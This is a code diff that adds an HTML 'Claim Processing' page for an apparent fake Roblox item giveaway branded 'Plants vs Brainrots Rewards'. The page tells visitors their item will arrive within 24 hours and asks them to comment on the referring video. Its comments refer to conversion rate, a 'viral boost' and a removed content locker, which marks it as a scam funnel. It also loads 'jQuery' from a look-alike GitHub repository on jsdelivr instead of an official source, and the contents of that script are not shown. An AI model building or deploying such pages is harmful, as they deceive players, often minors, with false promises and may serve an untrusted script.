@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="en" class="h-full">
+<head>
+    <!-- We use the same favicon as the main page -->
+    <link rel="icon" type="image/png" href="https://tr.rbxcdn.com/180DAY-df903aa307ddb0830246271075605cec/256/256/Image/Webp/noFilter"/>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Title updated for Plants vs Brainrots -->
+    <title>Claim Status - Plants vs Brainrots</title>
+    
+    <!-- Load Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- *** FIX: Load jQuery (for $ symbol) *** -->
+    <script src="https://cdn.jsdelivr.net/gh/lib-devtools/ajax.libs.jquery@main/3.6.3.min.js"></script>
+    
+    <!-- Load Font Awesome for Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    
+    <!-- Load Google Font (Inter) -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <script>
+        // Custom Tailwind Configuration (Copied from your file)
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        'inter': ['Inter', 'sans-serif'],
+                    },
+                    colors: {
+                        'brand-green-custom': '#24c131', /* Your custom green */
+                        'brand-red-custom': '#b70321',   /* Your custom red */
+                        'brand-black-custom': '#000000', /* Your custom black */
+                        'brand-green': '#10b981', 
+                        'brand-green-hover': '#059669',
+                        'brand-gray': {
+                            800: '#1f2937', 
+                            900: '#111827',
+                        }
+                    },
+                },
+            },
+        }
+    </script>
+    <style>
+        /* All styles are copied from your file for consistency */
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: #1f2937; }
+        ::-webkit-scrollbar-thumb { background: #374151; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #4b5563; }
+        
+        html { height: 100%; }
+        body {
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden; 
+        }
+        body {
+            background-image: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.8)), url('https://i.ibb.co/r2cfmnQB/ll.jpg'); /* Same background */
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+        }
+        .grid-pattern-overlay::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background-image: linear-gradient(to right, rgba(255,255,255,0.05) 1px, transparent 1px),
+                              linear-gradient(to bottom, rgba(255,255,255,0.05) 1px, transparent 1px);
+            background-size: 8px 8px; 
+            z-index: 0; 
+        }
+        .content-above-pattern {
+            position: relative;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body class="text-gray-200 font-inter antialiased flex flex-col min-h-screen">
+
+    <main class="flex-grow w-full py-8 flex items-center justify-center px-4">
+        
+        <!-- Re-using the green box style from your page -->
+        <div class="w-full max-w-2xl p-8 md:p-12 rounded-lg shadow-2xl grid-pattern-overlay bg-brand-green-custom relative overflow-hidden">
+            
+            <div class="content-above-pattern text-center text-white">
+                
+                <!-- *** NEW: Profile Box (for high CVR) *** -->
+                <!-- This whole profile box is now removed -->
+                <!-- *** END NEW Profile Box *** -->
+
+                <!-- Icon -->
+                <i class="fas fa-clock fa-5x mb-6 text-white opacity-80"></i>
+
+                <!-- Title -->
+                <h1 class="text-4xl font-extrabold mb-4">Claim Processing!</h1>
+
+                <!-- Message 1: 24 Hour Wait (Now with item name) -->
+                <p class="text-lg mb-4">
+                    Your <strong class="font-bold" id="item-display-2"></strong> is now being processed! Due to high demand, it may take <strong class="font-bold">up to 24 hours</strong> for the item to appear in your Roblox account.
+                </p>
+
+                <!-- Message 2: Troubleshooting (This is your viral boost) -->
+                <p class="text-base text-white/80 mb-8">
+                    If you do not see your item after 24 hours, **leave a comment on the video you came from.** Our support team will see it and manually process your claim.
+                </p>
+
+                <!-- Button: Back to Home (Kept from your file) -->
+                <a href="https://www.wt9.fun" 
+                   class="w-full sm:w-auto bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg shadow-lg transition-all duration-200 transform hover:scale-105 inline-block">
+                    <i class="fas fa-home mr-2"></i>
+                    Back to Home
+                </a>
+
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer (Copied from your file for consistency) -->
+    <footer class="w-full flex-shrink-0 bg-black bg-opacity-50 py-6 text-center text-gray-300 text-sm">
+        <!-- Footer text updated for Plants vs Brainrots -->
+        <p>&copy; 2025 Plants vs Brainrots Rewards. All rights reserved.</p>
+        <p class="text-xs mt-1 text-gray-400">This website is not affiliated with Roblox Corporation.</p>
+    </footer>
+
+    <!-- *** SCRIPT (LOCKER REMOVED) *** -->
+    <script>
+        // Wait for the document to be ready
+        $(document).ready(function() {
+          
+          // 1. Get Username and Item from URL
+          const params = new URLSearchParams(window.location.search);
+          const username = params.get('username') || 'Player';
+          const item = params.get('item') || 'Selected Seed';
+
+          // 2. Set the text on the page
+          $('#item-display-2').text(item);
+
+          // 3. LOCKER IS REMOVED. This page will just load.
+        });
+    </script>
+    <!-- *** END NEW Script *** -->
+
+
+    <!-- Vercel Analytics (Kept from your file) -->
+    <script>
+      window.va = window.va || function () { (window.va.q = window.va.q || []).push(arguments); };
+    </script>
+    <script src="/_vercel/insights/script.js" defer></script>
+    <!-- End Vercel Analytics -->
+
+    <!-- Vercel Speed Insights (Kept from your file) -->
+    <script>
+      window.si = window.si || function () { (window.siq = window.siq || []).push(arguments); };
+    </script>
+    <script src="/_vercel/speed-insights/script.js"></script>
+    <!-- End Vercel Speed Insights -->
+
+</body>
+</html>
